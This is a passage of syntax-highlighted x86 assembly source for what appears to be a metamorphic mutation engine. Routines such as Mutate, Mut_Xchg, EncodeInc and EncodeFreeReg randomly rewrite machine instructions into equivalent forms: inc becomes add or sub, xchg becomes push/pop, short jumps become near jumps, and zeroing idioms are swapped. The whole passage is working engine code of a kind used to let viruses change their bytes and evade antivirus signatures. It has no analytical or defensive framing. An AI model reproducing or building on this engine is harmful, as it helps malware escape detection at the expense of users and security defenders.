    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">mBadOpcode</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">mSkipBlock</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">xNoMorph</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">xNoMorph</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">mSkipBlock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Findt</span><span class="sc0">
</span><span class="sc5">mBadOpcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Mutate</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mut_ShortJmp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NotL</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">NotL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Mut_ShortJmp2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NotL1</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">NotL1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Mut_Loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetJmpAddr</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">          </span><span class="sc1">; dec ecx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; jnz ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NotL3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">NotL3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mut_CheckZero</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TryMutate</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotRegReg</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NotRegReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotRegReg</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeFreeReg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">NotRegReg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TryMutate</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TryMutate</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mut_MovZero</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TryMutate</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotRegReg</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotRegReg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeFreeReg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;=============</span><span class="sc0">
</span><span class="sc5">EncodeFreeReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">EncodeMovZero</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">ZeroTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EncodeMovZero</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EncodeFreeReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mut_Xchg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TryMutate</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoxMut</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">NoxMut</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mut_Inc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TryMutate</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoxMut</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeInc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;=============</span><span class="sc0">
</span><span class="sc5">EncodeInc</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">GenAdd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">GenSub</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GenAdd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GenSub</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EncodeInc</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mut_Dec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">TryMutate</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoxMut</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeDec</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;=============</span><span class="sc0">
</span><span class="sc5">EncodeDec</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DecAdd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DecSub</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DecAdd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DecSub</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EncodeDec</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TryIncDec</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NoxMut</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CheckAdd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoxMut</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">EnDec</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoxMut</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeInc</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnDec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeDec</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;==</span><span class="sc0">
</span><span class="sc5">CheckAdd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">EnxDec</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoxMut</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeInc</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnxDec</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">EncodeDec</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
